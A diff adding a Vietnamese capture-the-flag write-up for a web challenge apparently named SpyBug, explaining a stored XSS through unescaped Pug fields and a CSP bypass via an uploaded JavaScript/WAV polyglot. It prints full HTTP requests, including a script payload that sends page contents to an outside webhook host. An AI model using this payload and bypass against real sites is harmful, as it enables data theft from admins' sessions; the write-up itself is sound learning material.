@@ -233,6 +233,85 @@ Tạo một user mới với tên là payload để đọc `/flag.txt`:
 
 ![](https://i.imgur.com/bcvPkyf.png)
 
+## SpyBug
+#### Medium
+Bài này đọc sơ qua source ta tóm lại được là ứng dụng ngoài đăng nhập chính có thể cho ta tạo các agents với `24cbaf02-e82a-4079-8e37-f1724d12df28` và `c083682c-6685-44db-a207-955d220be2a9`. Ở panel thì chỉ có admin mới vào được, bên trong panel thì nếu user login vào là admin thì sẽ nhả ra flag, đọc file `panel.pug` để ý thấy:
+```
+td= agent.identifier
+td !{agent.hostname}
+td !{agent.platform}
+td !{agent.arch}
+```
+Trong pug thì cú pháp `!{}` sẽ in ra data mà không escape HTMl => Khả năng là XSS. 
+
+Các field như `hostname`, `platform` và `arch` ta có thể kiểm soát nhờ tạo agent và update thông tin bằng cách post vào endpoint `/agents/details/:identifier/:token`
+
+Tuy nhiên thì trang panel cũng có CSP:
+```javascript
+res.setHeader("Content-Security-Policy", "script-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none';");
+```
+Không có CDN, không có unsafe-eval, không có gì cả, vậy tạm thời chưa lợi dụng được XSS 
+
+Xem tiếp qua các chức năng thì ta thấy có chức năng upload file tại `/agents/upload/:identifier/:token` với điều kiện file upload lên phải là một file âm thanh có đuôi`.wav` và mimetype là `audio/wave`, ta có thể bypass bằng cách chèn magic byte của file âm thanh vào đầu nội dung upload:
+```
+RIFF????WAVE
+...
+```
+
+Nhưng bypass xong thì làm gì nữa??
+
+Nhớ lúc nãy ta bị vướng phải một cái CSP, vì `script-src 'self'` nên ta có thể chèn một tag script và trỏ `src` nó đến một file mà ta đã upload có nội dung là JavaScript, nhưng có một vấn đề là cái magic byte ta chèn khi nãy sẽ làm việc thực thi JS bị lỗi. Vấn đề này có thể được giải quyết bằng cách chèn `//` vào phía trước `RIFF????WAVE`, lý do là vì có vẻ như cái `multer` của nodejs nó chỉ check xem nếu tồn tại dãy bytes `RIFF????WAVE` trong nội dung là nó quy thành file audio luôn
+
+Lợi dụng up một file JS
+```http 
+POST /agents/upload/cb972a14-4831-4df2-a6d6-bd9d133631d3/9ad24240-d969-4820-9f5e-454bab98019d HTTP/1.1
+Host: 178.62.64.13:30716
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Content-Type: multipart/form-data;boundary=---------------------------735323031399963166993862150
+Cookie: connect.sid=s%3AyeBvXVfU9d7Zq3rvU43ZYk3sS0mrmD6M.BATGAIe1TKhjI331W8lSMBF7THhgyxP%2BLsnbiYdc4YM
+Connection: close
+Content-Length: 408
+
+-----------------------------735323031399963166993862150
+Content-Disposition: form-data; name="recording"; filename="hello.wav"
+Content-Type: audio/wave
+
+//RIFF????WAVE
+fetch("https://webhook.site/db89e937-1f11-4143-98ea-6c818714b78e", {method: "POST", mode:"no-cors", body: btoa(encodeURI(document.documentElement.innerHTML))}).then(a => b)
+-----------------------------735323031399963166993862150--
+```
+
+Update agent:
+
+```http 
+POST /agents/details/cb972a14-4831-4df2-a6d6-bd9d133631d3/9ad24240-d969-4820-9f5e-454bab98019d HTTP/1.1
+Host: 178.62.64.13:30716
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Accept-Language: en-US,en;q=0.9
+Cookie: connect.sid=s%3AyeBvXVfU9d7Zq3rvU43ZYk3sS0mrmD6M.BATGAIe1TKhjI331W8lSMBF7THhgyxP%2BLsnbiYdc4YM
+Connection: close
+Content-Length: 118
+
+hostname=</td></tr></table><script+src="/uploads/06ad58b4-6f7d-4bf9-876e-440ea748f8a9"></script>&platform=hack&arch=aa
+```
+Ta nhận được request ở webhook
+![](https://i.imgur.com/NSMGHuk.png)
+
+Decode ra ta được flag:
+```
+HTB{p01yg10t5_4nd_35p10n4g3}
+```
+
 ## TrapTrack
 #### Hard
 Ở bài này sau khi đọc source code, ta sẽ thấy thông tin login của admin ở file `challenge/application/config.py`
